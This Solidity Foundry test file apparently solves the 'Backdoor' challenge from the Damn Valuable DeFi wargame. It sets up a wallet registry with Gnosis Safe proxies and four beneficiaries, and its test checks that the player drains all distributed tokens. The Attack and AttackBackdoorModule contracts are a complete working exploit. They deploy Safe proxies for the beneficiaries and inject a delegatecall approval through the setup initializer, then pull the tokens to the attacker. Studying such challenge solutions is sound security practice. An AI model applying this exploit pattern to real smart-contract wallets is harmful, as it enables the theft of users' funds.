// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
import {Ownable} from "solady/src/auth/Ownable.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract BackdoorTest is Test {
    address public deployer;
    address public player;

    address public alice;
    address public bob;
    address public charlie;
    address public david;
    address[4] public users;

    uint256 public constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    WalletRegistry public walletRegistry;
    DamnValuableToken public token;
    GnosisSafe public masterCopy;
    GnosisSafeProxyFactory public walletFactory;

    function setUp() public {
        deployer = makeAddr("deployer");
        player = makeAddr("player");
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        charlie = makeAddr("charlie");
        david = makeAddr("david");
        users = [alice, bob, charlie, david];

        vm.startPrank(deployer);

        masterCopy = new GnosisSafe();
        walletFactory = new GnosisSafeProxyFactory();
        token = new DamnValuableToken();
        address[] memory initialBeneficiaries = new address[](users.length);
        for (uint256 i = 0; i < users.length; i++) {
            initialBeneficiaries[i] = users[i];
        }
        // deploy the registry
        walletRegistry =
            new WalletRegistry(address(masterCopy), address(walletFactory), address(token), initialBeneficiaries);

        assertEq(walletRegistry.owner(), deployer);
        vm.stopPrank();

        for (uint256 i = 0; i < users.length; i++) {
            assertEq(walletRegistry.beneficiaries(users[i]), true);

            vm.startPrank(users[i]);
            vm.expectRevert(Ownable.Unauthorized.selector);
            walletRegistry.addBeneficiary(users[i]);
            vm.stopPrank();
        }
        vm.startPrank(deployer);
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
        vm.stopPrank();
    }

    function exploit() public {
        vm.startPrank(player);
        address[] memory initialBeneficiaries = new address[](users.length);
        for (uint256 i = 0; i < users.length; i++) {
            initialBeneficiaries[i] = users[i];
        }
        Attack attack = new Attack(
            initialBeneficiaries, address(walletFactory), address(walletRegistry), address(masterCopy), address(token)
        );
        vm.stopPrank();
    }

    function test_exploit() public {
        exploit();
        assertEq(vm.getNonce(player), 1);
        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // wallet should not be address 0
            assertTrue(wallet != address(0));

            // user is no longer registered as a beneficiary
            assertEq(walletRegistry.beneficiaries(users[i]), false);
        }

        // player must own all tokens
        assertEq(token.balanceOf(player), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

contract Attack is Test {
    constructor(
        address[] memory _users,
        address _factory,
        address _walletRegistry,
        address _singleTon,
        address _token
    ) {
        AttackBackdoorModule backdoor = new AttackBackdoorModule();
        for (uint256 i; i < _users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = _users[i];
            // Step-2 : Create setupData. This data is initializer data that the proxy contract call on initialization.
            // Gnosis safe allows a delegate call during initialization. We put our malicious data of approving the target token for that factory.
            bytes memory _maliciousDelegateData =
                abi.encodeWithSignature("approve(address,address,uint256)", address(this), _token, 10 ether);
            bytes memory setupData = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(backdoor),
                _maliciousDelegateData,
                address(0),
                0,
                0,
                0
            );
            // Step-3 : Deploy proxy with users as the owner of the proxy so that Walletregistry would send tokens to this deployed proxy.
            GnosisSafeProxy proxy = GnosisSafeProxyFactory(_factory).createProxyWithCallback(
                _singleTon, setupData, 0, IProxyCreationCallback(_walletRegistry)
            );
            emit log_named_decimal_uint("approval", IERC20(_token).allowance(address(proxy), address(this)), 18);
            // Step-4 : Transfer the allowed token of the proxy contract to the attacker.
            IERC20(_token).transferFrom(address(proxy), msg.sender, 10 ether);
        }
    }
}

contract AttackBackdoorModule {
    function approve(address approvalAddress, address token, uint256 amount) public {
        DamnValuableToken(token).approve(approvalAddress, amount);
    }
}
